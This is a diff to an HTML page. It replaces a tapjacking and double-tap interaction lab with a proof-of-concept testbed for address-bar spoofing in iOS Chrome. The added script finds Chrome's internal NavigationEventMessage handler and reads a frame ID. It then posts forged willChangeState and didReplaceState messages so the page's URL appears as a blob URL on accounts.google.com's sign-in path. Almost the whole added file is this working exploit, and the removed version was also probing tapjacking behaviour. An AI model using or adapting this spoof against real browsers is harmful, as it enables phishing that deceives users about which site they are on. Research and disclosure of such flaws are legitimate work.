@@ -1,194 +1,85 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Tapjacking & Double-Tap Lab</title>
-
+    <title>PoC Testbed - Address Bar Spoofing</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #121212;
-            color: #e0e0e0;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-end;
-            min-height: 90vh;
-            cursor: pointer;
-        }
-
-        h1 {
-            color: #ff5252;
-            font-size: 18px;
-            margin-bottom: 5px;
-        }
-
-        .info-box {
-            background: #1e1e1e;
-            border: 1px solid #333;
-            padding: 10px;
-            border-radius: 6px;
-            max-width: 500px;
-            width: 100%;
-            font-size: 11px;
-            color: #b0b0b0;
-            margin-top: 15px;
-            text-align: left;
-            max-height: 150px;
-            overflow-y: auto;
-        }
-
-        code {
-            background: #2d2d2d;
-            color: #ff8a80;
-            padding: 2px 4px;
-            border-radius: 3px;
-            font-family: monospace;
-        }
-
-        .interactive-zone {
-            position: relative;
-            margin-bottom: 20px;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
+        body { font-family: -apple-system, sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
+        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        pre { background: #272822; color: #f8f8f2; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
+        .success { color: green; font-weight: bold; }
+        .fail { color: red; font-weight: bold; }
     </style>
 </head>
-
 <body>
-
-    <h1>Double-Tap Interaction Lab</h1>
-
-    <p style="font-size: 12px; color: #888;">
-        Browser interaction and permission behavior testing.
-    </p>
-
-    <div class="interactive-zone">
-        <input
-            id="input"
-            type="time"
-            list="times"
-            style="display:none;"
-        />
-
-        <datalist id="times">
-            <select>
-                <option label="--">00:00</option>
-                <option label="--">00:01</option>
-                <option label="Test option">00:02</option>
-                <option label="--">00:03</option>
-                <option label="--">00:04</option>
-                <option label="--">00:05</option>
-                <option label="--">00:06</option>
-                <option label="--">00:07</option>
-                <option label="Test option">00:08</option>
-                <option label="--">00:09</option>
-                <option label="--">00:10</option>
-            </select>
-        </datalist>
-    </div>
-
-    <div class="info-box" id="log-box">
-        <strong>Status Log:</strong> Waiting for interaction...
-    </div>
+<div class="card">
+    <h2>iOS Chrome History State PoC Testbed</h2>
+    <p>Status: <span id="status">Initializing...</span></p>
+    <pre id="log"></pre>
+</div>
 
 <script>
-(() => {
-    "use strict";
-
-    const logBox = document.getElementById("log-box");
-    const input = document.getElementById("input");
-
-    let clickCount = 0;
-
-    function appendLog(msg) {
-        console.log(msg);
-
-        const line = document.createElement("div");
-
-        line.textContent =
-            `[${new Date().toLocaleTimeString()}] ${msg}`;
-
-        logBox.appendChild(line);
-        logBox.scrollTop = logBox.scrollHeight;
+(function() {
+    function logMessage(msg) {
+        const pre = document.getElementById('log');
+        pre.textContent += msg + '\n';
+        console.log('[PoC] ' + msg);
     }
 
-    function activationState() {
-        if (!navigator.userActivation) {
-            return "unavailable";
-        }
+    logMessage("Location origin: " + (location.origin || '(opaque)'));
+    logMessage("Location href: " + location.href);
 
-        return JSON.stringify({
-            active: navigator.userActivation.isActive,
-            previouslyActive:
-                navigator.userActivation.hasBeenActive
+    // 1. Deteksi keberadaan script message handler iOS Chrome
+    var mh = (window.webkit && window.webkit.messageHandlers) || {};
+    if (!mh.NavigationEventMessage) {
+        document.getElementById('status').textContent = "Not vulnerable / Non-iOS Chrome environment";
+        document.getElementById('status').className = "fail";
+        logMessage("[-] window.webkit.messageHandlers.NavigationEventMessage is absent.");
+        return;
+    }
+
+    document.getElementById('status').textContent = "Handler detected. Attempting state dispatch...";
+    document.getElementById('status').className = "success";
+    logMessage("[+] NavigationEventMessage handler found.");
+
+    // 2. Ambil frame_id dari page-world __gCrWeb jika tersedia
+    var fid = null;
+    try {
+        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+            fid = window.__gCrWeb.getFrameId();
+            logMessage("[+] __gCrWeb.getFrameId() = " + fid);
+        }
+    } catch (e) {
+        logMessage("[-] Error reading frameId: " + e);
+    }
+
+    if (!fid) {
+        logMessage("[-] Failed to retrieve frame_id. Aborting dispatch.");
+        return;
+    }
+
+    // 3. Eksekusi pengiriman pesan didReplaceState dengan target cross-origin blob
+    var spoofTarget = 'blob:https://accounts.google.com/signin';
+    
+    try {
+        mh.NavigationEventMessage.postMessage({
+            command: 'willChangeState', 
+            frame_id: fid
         });
+        
+        mh.NavigationEventMessage.postMessage({
+            command: 'didReplaceState', 
+            frame_id: fid,
+            stateObject: '', 
+            baseUrl: 'https://x/',
+            pageUrl: spoofTarget
+        });
+        
+        logMessage("[+] Dispatched crafted didReplaceState payload targeting: " + spoofTarget);
+    } catch (err) {
+        logMessage("[-] postMessage failed: " + err);
     }
-
-    // Pointer interaction monitoring
-
-    document.body.addEventListener("pointerdown", (event) => {
-
-        clickCount++;
-
-        appendLog(
-            `Interaction #${clickCount} detected.`
-        );
-
-        appendLog(
-            `Pointer type: ${event.pointerType}`
-        );
-
-        appendLog(
-            `Trusted event: ${event.isTrusted}`
-        );
-
-        appendLog(
-            `User activation: ${activationState()}`
-        );
-
-        // Picker behavior observation
-
-        try {
-            input.showPicker();
-
-            appendLog(
-                "showPicker() invocation successful."
-            );
-
-        } catch (error) {
-
-            appendLog(
-                `Picker error: ${error.name}: ${error.message}`
-            );
-        }
-
-    }, { passive: true });
-
-    // Environment information
-
-    appendLog("Lab initialized.");
-
-    appendLog(
-        `Secure context: ${window.isSecureContext}`
-    );
-
-    appendLog(
-        `Geolocation available: ${!!navigator.geolocation}`
-    );
-
-    appendLog(
-        `Browser: ${navigator.userAgent}`
-    );
-
 })();
 </script>
-
 </body>
 </html>
